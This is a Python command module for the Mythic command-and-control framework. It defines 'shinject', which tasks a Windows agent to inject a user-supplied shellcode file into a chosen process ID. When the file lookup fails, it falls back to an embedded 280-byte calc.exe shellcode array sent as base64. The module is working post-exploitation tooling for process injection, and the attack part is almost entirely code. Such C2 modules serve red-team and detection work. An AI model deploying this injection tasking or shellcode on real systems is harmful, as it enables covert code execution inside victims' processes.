from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json

class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number,
                description="Process ID to inject into.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    ),
                ]),
            CommandParameter(
                name="shellcode",
                cli_name="Shellcode",
                display_name="Shellcode File",
                type=ParameterType.File,
                description="Shellcode file to inject",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    ),
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.\n\tUsage: {}".format(ShinjectCommand.help_cmd))
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(ShinjectCommand.help_cmd))
        self.load_args_from_json_string(self.command_line)


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject (modal popup)"
    description = "Inject shellcode into a remote process."
    version = 1
    author = "@checkymander"
    argument_class = ShinjectArguments
    attackmapping = ["T1055"]  # Process Injection
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows]  # Windows only for this implementation
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        print(f"DEBUG: Starting shinject task creation for PID {taskData.args.get_arg('pid')}")
        print(f"DEBUG: Shellcode file ID: {taskData.args.get_arg('shellcode')}")
        
        try:
            print(f"DEBUG: Searching for file with ID: {taskData.args.get_arg('shellcode')}")
            # Get file information from Mythic
            file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                AgentFileID=taskData.args.get_arg("shellcode"),
                TaskID=taskData.Task.ID,
            ))
            
            print(f"DEBUG: File search response - Success: {file_resp.Success}")
            if not file_resp.Success:
                print(f"DEBUG: File search failed with error: {file_resp.Error}")
            else:
                print(f"DEBUG: Found {len(file_resp.Files)} file(s)")
            
            if file_resp.Success:
                if len(file_resp.Files) > 0:
                    # Debug: Print all available attributes on the FileData object
                    file_data = file_resp.Files[0]
                    print(f"DEBUG: FileData object attributes: {dir(file_data)}")
                    
                    # Try to get the filename using different possible attribute names
                    original_file_name = None
                    if hasattr(file_data, 'Filename'):
                        original_file_name = file_data.Filename
                    elif hasattr(file_data, 'filename'):
                        original_file_name = file_data.filename
                    elif hasattr(file_data, 'name'):
                        original_file_name = file_data.name
                    
                    # Try to get the file size using different possible attribute names
                    file_size = None
                    if hasattr(file_data, 'Size'):
                        file_size = file_data.Size
                    elif hasattr(file_data, 'size'):
                        file_size = file_data.size
                    elif hasattr(file_data, 'file_size'):
                        file_size = file_data.file_size
                    
                    # Try to get the agent file ID using different possible attribute names
                    agent_file_id = None
                    if hasattr(file_data, 'AgentFileId'):
                        agent_file_id = file_data.AgentFileId
                    elif hasattr(file_data, 'agent_file_id'):
                        agent_file_id = file_data.agent_file_id
                    elif hasattr(file_data, 'id'):
                        agent_file_id = file_data.id
                    
                    # Fallback defaults if attributes were missing
                    if original_file_name is None:
                        original_file_name = "shellcode.bin"
                    if file_size is None:
                        file_size = 0

                    print(f"DEBUG: Processing file - Name: {original_file_name}, Size: {file_size}, ID: {agent_file_id}")
                    
                    response.DisplayParams = "Injecting {} ({} bytes) into PID {}".format(
                        original_file_name, 
                        file_size,
                        taskData.args.get_arg("pid")
                    )
                    
                    # Replace the shellcode parameter with the file ID that the agent expects
                    # The Rust agent looks for "shellcode-file-id" parameter
                    print(f"DEBUG: Adding shellcode-file-id parameter: {agent_file_id}")
                    taskData.args.add_arg("shellcode-file-id", agent_file_id)
                    taskData.args.remove_arg("shellcode")
                    
                    # Set the file to be deleted after the agent fetches it
                    # This triggers Mythic's automatic file download to the agent
                    print(f"DEBUG: Setting file to be deleted after fetch")
                    await SendMythicRPCFileUpdate(MythicRPCFileUpdateMessage(
                        AgentFileID=agent_file_id,
                        DeleteAfterFetch=True,
                        Comment="Shellcode for injection into process {}".format(taskData.args.get_arg("pid"))
                    ))
                    
                    print(f"DEBUG: Prepared shellcode file {original_file_name} (ID: {agent_file_id}) for injection into PID {taskData.args.get_arg('pid')}")
                    print(f"DEBUG: Task parameters after processing: {taskData.args}")
                    
                else:
                    raise Exception("Failed to fetch uploaded file from Mythic (ID: {})".format(taskData.args.get_arg("shellcode")))
            else:
                # Fallback to embedded shellcode if file upload fails
                print(f"DEBUG: File upload failed, using fallback shellcode")
                
                # Embedded calc.exe shellcode (280 bytes)
                fallback_shellcode = [
                    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                    0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xfe,0x0e,0x32,0xea,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                    0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
                ]
                
                # Convert to base64 for transmission
                import base64
                fallback_shellcode_bytes = bytes(fallback_shellcode)
                fallback_shellcode_b64 = base64.b64encode(fallback_shellcode_bytes).decode()
                
                response.DisplayParams = "Injecting fallback calc.exe shellcode ({} bytes) into PID {}".format(
                    len(fallback_shellcode_bytes),
                    taskData.args.get_arg("pid")
                )
                
                # Send the shellcode directly as base64
                taskData.args.add_arg("shellcode-base64", fallback_shellcode_b64)
                taskData.args.remove_arg("shellcode")
                
                print(f"DEBUG: Using fallback shellcode ({len(fallback_shellcode_bytes)} bytes) for injection into PID {taskData.args.get_arg('pid')}")
                
        except Exception as e:
            response.Success = False
            response.Error = "Error preparing shellcode file: {}".format(str(e))
            print(f"DEBUG: Error in create_go_tasking: {str(e)}")
            
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        """
        Process the agent response from shellcode injection
        """
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        
        print(f"DEBUG: Processing shinject response for task {task.Task.ID}")
        print(f"DEBUG: Response type: {type(response)}")
        print(f"DEBUG: Response content: {response}")
        
        try:
            # FIX: Handle both string and JSON responses
            if isinstance(response, dict):
                # JSON response - extract output
                response_text = response.get("output", str(response))
                print(f"DEBUG: Extracted JSON response text: {response_text}")
            else:
                # Plain string response
                response_text = str(response)
                print(f"DEBUG: Using plain string response: {response_text}")
            
            # Create a task response output
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=response_text.encode()
            ))
            
            # Log successful injection for operation events
            if any(success_word in response_text.lower() for success_word in ["success", "injected", "executed"]) and "fail" not in response_text.lower():
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message="Successfully injected shellcode into PID {}".format(task.args.get_arg("pid")),
                    Level="info"
                ))
                
            elif "error" in response_text.lower() or "fail" in response_text.lower():
                await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                    TaskID=task.Task.ID,
                    Message="Failed to inject shellcode into PID {}: {}".format(task.args.get_arg("pid"), response_text),
                    Level="warning"
                ))
                
        except Exception as e:
            error_msg = "Error processing shinject response: {}".format(str(e))
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=error_msg.encode()
            ))
            resp.Success = False
            resp.Error = error_msg
            
        return resp